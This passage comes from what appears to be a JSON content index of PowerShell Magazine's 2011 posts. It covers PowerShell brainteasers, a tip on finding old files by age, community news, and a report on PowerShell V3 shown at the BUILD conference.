ScriptBlock (we\u0026rsquo;ll call this one “Scope B”), call the Get-Variable Cmdlet with the appropriate arguments to retrieve only the value of the private variable that is visible only in the parent\u0026rsquo;s scope (Scope “A”).\nWinner: Shay Levy ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/13/private-variable/","tags":["Brainteaser"],"title":"Private variable"},{"categories":["Brainteaser"],"contents":"Problem Given an Array of at least 2 elements, return a new Array of formatted elements without using array indices, pipelines or loop statements.\nSolution $array = 1..7 -split (\u0026#39;{0:C}\u0026#39; -f [PSObject]$array) -split (\u0026#39;{0:C}\u0026#39; -f ($array -as \u0026#39;PSObject\u0026#39;)) The secret is to cast the Array as PSObject, this causes PowerShell to enumerate all elements internally looking for extended members, the Format Operator performs its magic on each element and returns a single String with the new -formatted- String Array expanded within it. Finally the Split Operator breaks the String and we get a new String Array of formatted Strings.\nWinner: No one ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/13/format-elements/","tags":["Brainteaser"],"title":"Format elements"},{"categories":["Brainteaser"],"contents":"Problem Reverse a line of text without the use of Array\u0026rsquo;s Reverse method, Array indices, Array notation, pipelines or loop statements.\nSolution $str = \u0026#39;!ereh saw yorliK\u0026#39; -join (New-Object RegEx ., RightToLeft).Matches($str) Set the RightToLeft option to an “all-characters-in-a-line” matching Regular Expression and pass the line of text to its Matches method. This will return all the characters in the line from the end to the start of the line. Then, use the Join operator to return the reversed text.\nWinner: Rob Campbell ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/13/reverse-text-line/","tags":["Brainteaser"],"title":"Reverse text line"},{"categories":["News"],"contents":"Keith Hill, a PowerShell MVP and the brain behind PowerShell Community Extensions, agreed to get you all the PowerShell information live from the BUILD conference.\n BUILD is a new event that shows modern hardware and software developers how to take advantage of the future of Windows. Learn how to work with the all new touch-centric user experience to create fast, fluid, and dynamic applications that leverage the power and flexibility of the core of Windows, used by more than a billion people around the world.\n Stay tuned for his posts. Thanks Keith!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/13/powershell-magazine-at-the-build-conference/","tags":["Conferences","News"],"title":"PowerShell Magazine at the BUILD conference"},{"categories":["News"],"contents":"Today, we are very happy to announce the launch of PowerShellMagazine.com – a magazine dedicated to Windows PowerShell.\nWhat an exciting journey this was! A while ago, I started with this thought of a magazine for PowerShell specific content. I sketched the outline I thought was good and shared those details with Aleksandar Nikolic. Being a great technical reviewer, Aleksandar is very keen on details. He refined the outline I’d proposed and we were ready to start the “real” work. We got some great minds from the PowerShell community with us. We invited Doug Finke, Robert Robelo, Shay Levy, and Steven Murawski to be a part of the founding team and editor’s panel. After less than two months, we just did the website launch and are working hard to release the first edition in October.\nThe launch of the website is just the beginning. We are not done yet and will continue to refine the look and feel of the site. You will see us posting lot of “online only” content that may not get into the first edition of PowerShell Magazine. You can take a tour of the website’s content using the navigation menu just below the magazine logo or tag cloud in the sidebar. We will make sure to keep this interactive by posting brainteasers, quizzes, and many more!\nWe have also enabled simplified UI for the mobile devices such as iPhone, etc. We will enable many more features in the coming days for better portable device experience.\nWe are already working on the second and third editions of PowerShell Magazine. If you are keen on writing for us, feel free to submit your proposal. If you are keen on sponsoring the articles or placing your ad banners on this site, reach us at editors@powershellmagazine.com.\nWe will interact with you on all available social networks (more or less!) to get your feedback and comments. You can follow us on Twitter at @PowerShellMag, become a fan of our Facebook page, or just send us an email at editors@powershellmagazine.com.\nTell us what is your first impression of this site and what we need to improve by leaving comments here. Happy reading!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/12/announcing-the-launch-of-powershell-magazine-website/","tags":["News"],"title":"Announcing the launch of PowerShell Magazine website!"},{"categories":["Tips and Tricks"],"contents":"When it comes to finding old files in PowerShell we have several options, all in which involve subtracting DateTime objects or using comparison operators. For example, if we want to remove all files older than 14 days, we can test if the LastWriteTime property of each FileInfo object is greater than a DateTime objects which has been subtracted 14 days:\nPS\u0026gt; $date = (Get-Date).AddDays(-14) PS\u0026gt; Get-ChildItem -Path D:\\Temp -Recurse | Where-Object {-not $_.PsIsContainer -and $_.LastWriteTime -lt $date } | Remove-Item -WhatIf In the above example we initialize $date to a date in the past and test against it inside Where-Object. When the older file is found, based on its LastWriteTime property, it is passed through to the Remove-Item cmdlet.\nHowever, this doesn’t tell as the age of the file. We can produce a list of old files and create a new calculated property that will calculate the age:\nPS\u0026gt; $age = @{Name=\u0026#39;Age(Days)\u0026#39;;Expression={((Get-Date) - $_.LastWriteTime).Days}} PS\u0026gt; Get-ChildItem | Select-Object -Property Name,FullName,$age Now we get a 3-column output with an age of each file system object (including directories).\nThe expression we are using subtracts the LastWriteTime value of each file from the current date, which produces a TimeSpan object, and then we call its Days property to get the result.\nBut, did you know that you can also pipe file system objects to the New-TimeSpan cmdlet and it will give you the same result?\nPS\u0026gt; Get-ChildItem -Path $env:WINDIR\\system.ini | New-TimeSpan Days : 137 Hours : 4 Minutes : 34 Seconds : 54 Milliseconds : 274 Ticks : 118532942742544 TotalDays : 137.190905952019 TotalHours : 3292.58174284844 TotalMinutes : 197554.904570907 TotalSeconds : 11853294.2742544 TotalMilliseconds : 11853294274.2544 As you can see, system.ini is 137 days old. So, how does this work? Let’s take a close look of the Start parameter of New-TimeSpan:\nPS\u0026gt; (Get-Command New-TimeSpan).Parameters[\u0026#39;Start\u0026#39;] Name : Start ParameterType : System.DateTime ParameterSets : {[Date, System.Management.Automation.ParameterSetMetadata]} IsDynamic : False Aliases : {LastWriteTime} Attributes : {System.Management.Automation.AliasAttribute, Date} SwitchParameter : False The Aliases member has the LastWriteTime alias defined, meaning that if an incoming object has a property of that name it will be automatically bind to the Start parameter. Pretty neat. So, based on the above we can also write a shorter expression:\nPS\u0026gt; $age = @{Name=\u0026#39;Age(Days)\u0026#39;;Expression={($_ | New-TimeSpan).Days}} PS\u0026gt; Get-ChildItem | Select-Object -Property Name,FullName,$age ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/11/finding-old-files/","tags":["Tips and Tricks"],"title":"Finding Old Files"},{"categories":["News"],"contents":"Kirk Munro a.k.a @Poshoholic announced his departure from Quest on July 28th. Kirk has been very instrumental in several releases of PowerGUI. He is a very active member of community and helps people learn a lot. On September 6th, Kirk announced that he is joining DevFarm as a product manager for their PowerWF and PowerSE products. Here is an excerpt from Kirk’s announcement.\n This really represents how I have felt since my departure from my last job as Product Manager for PowerGUI. I really love PowerShell as a technology, but as great as that technology is, it just wouldn’t be the same without the community that surrounds it. PowerShell is blessed to have a tremendous community, and I am very, very proud to be able to continue to participate in that same community as a Product Manager for some really cool products that use PowerShell, as a PowerShell MVP, and as a geek who fell in love with technology a long time ago.\nNow that I’ve found my new direction and focus, it’s time to get down to business. Whether you’re a current user of PowerWF or PowerSE or someone who is interested in tryingPowerWF or PowerSE, I’d love to connect with you to hear what you like (or don’t like) about these products as well as what you would like to see added to them in the future.\n Good luck, Kirk.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/10/news-poshoholic-moved-from-quest-to-devfarm/","tags":["News"],"title":"News: Poshoholic moved from Quest to DevFarm"},{"categories":["News"],"contents":"The Experts Conference 2011, Europe will be hosting the PowerShell Deep Dive. The PowerShell team has announced the first 8 session abstracts for the PowerShell Deep Dive in Frankfurt. More information on the PowerShell team blog, HERE.\nThree of the editors from the PowerShell Magazine — Shay, Aleksandar, and Ravi — will be there at the conference! Join us there if you happen to be around Frankfurt or in Germany during October.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/03/powershell-deep-dive-session-abstracts/","tags":["News","Conferences"],"title":"News: PowerShell Deep Dive session at TEC2011"},{"categories":["News"],"contents":"Microsoft took the wraps off Windows PowerShell V3 at the BUILD conference today in the broader context of the Windows Management Framework (WMF). There were several sessions covering PowerShell today including 10 minutes of the Windows Server 8 keynote where Jeffrey Snover got a chance to talk about the server manageability story with WMF. Later sessions included:\n Windows Server 8 apps must run without a GUI – learn more now Make your product manageable Manage a highly-efficient environment at scale using the Windows Management Framework  During these sessions, Microsoft indicated they invested heavily in:\n Making it easier to create manageable devices by making it easier to provide CIM data via both native and managed code. We also heard the WMF would align to CIM standards. Making it easier to manage many machines(physical and virtual) and devices using WMF. For Windows PowerShell that means, more robust remoting connections including the ability to disconnect and reconnect to remote sessions as well as Microsoft WorkFlow integration to allow such scenarios as allowing one machine to run a workflow remotely on a machine that installs new Windows features, requiring reboots, all within the context of the workflow. Microsoft also showed off a new Server Dashboard for managing multiple machines. The UI sports a “Metro-inspired” look that is quite elegant.  We also learned that PowerShell V3 would be sitting atop the Dynamic Language Runtime (DLR) and as a result, scripts get compiled allowing them to run up to 6x faster than they would on V2.\nPowerShell has beefed up the jobs support in this new version to include an extensibility mechanism referred to as a job source adapter. If you have something that can be started, stopped, suspended and resumed like a job then you can plug that into the PowerShell job infrastructure such that the existing PowerShell *-Job cmdlets can manipulate it. A couple of new job cmdlets have been added: Suspend-Job and Resume-Job. Microsoft has used this mechanism to allow you to create scheduled jobs as well as manage workflows.\nAnd of course, there are lots of new commands. In fact, there are 44 modules out of the box on the Windows 8 developer preview. Many of these new modules are provided by various Windows Server teams e.g.: BranchCache, Dism, DndConfig, DnsLookup, NetAdapter, NetTCPIP, ScheduledTasks, SmbShare, Storage to name a few.\nThe Windows PowerShell ISE has been updated to provide drop-down Intellisense via an improved tab expansion mechanism. There are built-in code snippets that you can customize. And finally, ISE has a recently opened files list! There are many more new features in PowerShell V3 than I\u0026rsquo;ve listed here. More on that later.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/03/powershell-version-3-unveiled-at-microsoft-build-conference/","tags":["News"],"title":"PowerShell Version 3 Unveiled at Microsoft BUILD Conference"}]